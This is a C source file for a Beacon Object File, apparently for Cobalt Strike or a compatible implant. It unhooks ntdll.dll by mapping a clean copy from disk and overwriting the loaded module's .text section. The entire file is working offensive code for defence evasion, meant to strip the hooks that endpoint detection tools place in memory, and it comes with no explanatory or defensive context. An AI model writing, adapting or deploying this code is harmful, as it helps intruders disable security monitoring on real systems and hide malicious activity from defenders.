#include <windows.h>
#include "beacon_compat.h"

/* BOF-style imports */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT UINT    WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileMappingW(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$UnmapViewOfFile(LPCVOID);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ntdll.dll not found\n");
        return;
    }

    /* Build path to clean ntdll on disk */
    wchar_t ntdllPath[MAX_PATH];
    KERNEL32$GetSystemDirectoryW(ntdllPath, MAX_PATH);
    MSVCRT$wcscat(ntdllPath, L"\\ntdll.dll");

    HANDLE hFile = KERNEL32$CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open ntdll.dll from disk: %lu\n",
                     KERNEL32$GetLastError());
        return;
    }

    HANDLE hMapping = KERNEL32$CreateFileMappingW(hFile, NULL,
                                         PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileMapping failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hFile);
        return;
    }

    void *pClean = KERNEL32$MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) {
        BeaconPrintf(CALLBACK_ERROR, "[!] MapViewOfFile failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hMapping);
        KERNEL32$CloseHandle(hFile);
        return;
    }

    /* Find .text section */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE *)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;

    BOOL patched = FALSE;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            DWORD textRVA  = section[i].VirtualAddress;

            void *pHooked   = (BYTE *)hNtdll + textRVA;
            void *pOriginal = (BYTE *)pClean + textRVA;

            DWORD oldProtect;
            if (!KERNEL32$VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n",
                             KERNEL32$GetLastError());
                break;
            }

            memcpy(pHooked, pOriginal, textSize);
            KERNEL32$VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
            patched = TRUE;

            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] ntdll.dll .text restored (%lu bytes at RVA 0x%lX)\n",
                textSize, textRVA);
            break;
        }
    }

    KERNEL32$UnmapViewOfFile(pClean);
    KERNEL32$CloseHandle(hMapping);
    KERNEL32$CloseHandle(hFile);

    if (!patched)
        BeaconPrintf(CALLBACK_ERROR, "[!] .text section not found in ntdll\n");
}
